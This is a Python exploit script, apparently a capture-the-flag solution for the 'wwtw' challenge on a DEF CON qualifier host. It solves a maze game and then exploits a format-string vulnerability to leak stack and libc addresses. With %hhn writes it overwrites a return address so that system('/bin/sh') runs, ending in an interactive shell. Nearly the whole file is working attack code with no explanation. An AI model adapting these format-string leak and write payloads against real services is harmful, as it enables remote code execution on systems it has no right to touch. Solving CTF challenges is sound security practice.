from zio import *
import struct
import time
import re

offset = 0xffd48d86 - 0xffd48d40 + 4
def gen_get():
    start = ['^', '<', '>', 'V']
    map_data_t = []
    for x in map_data_in.split('\n'):
        if 'find' in x:
            continue
            pass
        if '012345' in x:
            continue
            pass
        tmp = []
        tmp = [y for count, y in enumerate(x) if count > 2]
        map_data_t.append(tmp)
    for i, x in enumerate(map_data_t):
        for j, y in enumerate(x):
            if y in start:
                s_x = i
                s_y = j
            if y == 'E' or y == 'T':
                e_x = i
                e_y = j
    return s_x, s_y, e_x, e_y, map_data_t


def mapsearch(s_x, s_y, e_x, e_y, map_data):
    head = 0
    tail = 0
    line1 = [[s_x, s_y, '', -1]]
    line0 = [[s_x, s_y]]
    d_l = [[0, 1, 'd'], [1, 0, 's'], [0, -1, 'a'], [-1, 0, 'w']]
    while tail >= head:
        s_x = line0[head][0]
        s_y = line0[head][1]
        for d in d_l:
            t_x = s_x + d[0]
            t_y = s_y + d[1]
            if t_x >=0 and t_y >= 0 and t_x < 20 and t_y < 20:
                if [t_x, t_y] not in line0 and map_data[t_x][t_y] != 'A':
                    line1.append([t_x, t_y, d[2], head])
                    tail += 1
                    line0.append([t_x, t_y])
                if map_data[t_x][t_y] == 'E' or map_data[t_x][t_y] == 'T':
                    head = tail
                    break
        head += 1
    flag = line1[-1][-1]
    s = ''
    i = -1
    while flag != -1:
        s += line1[i][-2]
        i = line1[i][-1]
        flag = i
    return s[::-1]


io = zio(('wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me', 2606), timeout=9999)
# io = zio('./wwtw', timeout=9999)
io.read_until('blink!\n')

for x in xrange(5):
    map_data_in = io.read_until('Your move (w,a,s,d,q):')[25:-23]
    map_data = []
    s_x, s_y, e_x, e_y,map_data = gen_get()
    path = mapsearch(s_x, s_y, e_x, e_y, map_data)

    for next_step in xrange(len(path) - 1):
        io.writeline(path[next_step])
        map_data_in = io.read_until('Your move (w,a,s,d,q):')[25:-23]
    io.writeline(path[-1])    

io.read_until('KEY')
io.writeline('UeSlhCAGEp')
io.read_until('Selection:')
io.writeline(struct.pack('Q', ord('1'))+'\x00')
io.read_until('Selection:')
print 'sleep'
time.sleep(3)
io.write('\x70\x2b\x59\x55')
io.read_until('Selection:')
io.writeline('1')
io.read_until('Selection:')
io.writeline('3')
io.read_until('Coordinates:')
#io.gdb_hint()
io.writeline('51.492137,-0.192878,%211$8x%p%p%p%p%p%p%p%p%p')
#io.gdb_hint
str1 = io.read_until(' is')
addr_ret =  int(str1[-13:-3],16) - offset
addr_tmp =  int(str1[-23:-13],16) 
addr_system = addr_tmp - 0x1e4040 + 0x3e340

addr_pop = addr_tmp + 0x2a03
str_pop = hex(addr_pop)[-4:-2]
int_pop = int(str_pop,16)

print int_pop
print 'ret:',hex(addr_ret)
print 'system',hex(addr_system)

io.writeline('3')
io.read_until('Coordinates:')
offset = 0x1a20 + 0x45a0 + 0x1c
io.writeline('51.492137,-0.192878,AAAA%8$x')
addr_tmp = io.read_until(' is')
print addr_tmp[-11:-3]
got_bzero =  int(addr_tmp[-11:-3],16) + offset
print hex(got_bzero)
main_addr = got_bzero - 0x1c - 0x45a0
print 'main_addr:', hex(main_addr)

io.writeline('3')
io.read_until('Coordinates:')
io.writeline('51.492137,-0.192878,' + l32(got_bzero) + '%20$s')
addr_tmp = io.read_until(' is')[:-3]
libc_bzero = struct.unpack('I',addr_tmp[addr_tmp.find('51.492137,-0.192878')+24:addr_tmp.find('51.492137,-0.192878')+28])[0]
print 'libc_getchar: ',hex(libc_bzero)
libc_main = libc_bzero - 0x00674a0
libc_system = libc_main + 0x0040190
print 'libc_main', hex(libc_main)
print 'libc_system', hex(libc_system)

io.writeline('3')
io.read_until('Coordinates:')
payload1 = '51.492137,-0.192878,aaaaaa'

#io.gdb_hint()

'''ret to 1A43'''

if int_pop < 0x43:
	print 'small'
	payload_first = payload1 + (int_pop-len(payload1)) * 'a' + '%' + str(24+(int_pop-len(payload1))/4) + '$xaaaaa' + struct.pack('<I',addr_ret + 1)
	payload_second = (0x47 - len(payload_first) + 4) * 'a' + '%36$xaaa'+ struct.pack('<I',addr_ret)
else:
	print 'big'
	payload_first = '51.492137aaaaaaa'+struct.pack('<I',libc_system)+'aaaa'+struct.pack('<I',libc_main+0x160a24)+'a,-0.192878,aaaaaa' + (0x43-46) * 'b' + '%34$hhnaa' + struct.pack('<I',addr_ret)
	payload_second = (int_pop - len(payload_first) + 7) * 'b' + '%'+str(((int_pop - len(payload_first))/4 + 35+6)) + '$hhn'+'/bin/sh\00'+ struct.pack('<I',addr_ret + 1)

io.writeline(payload_first + payload_second)

io.interact()
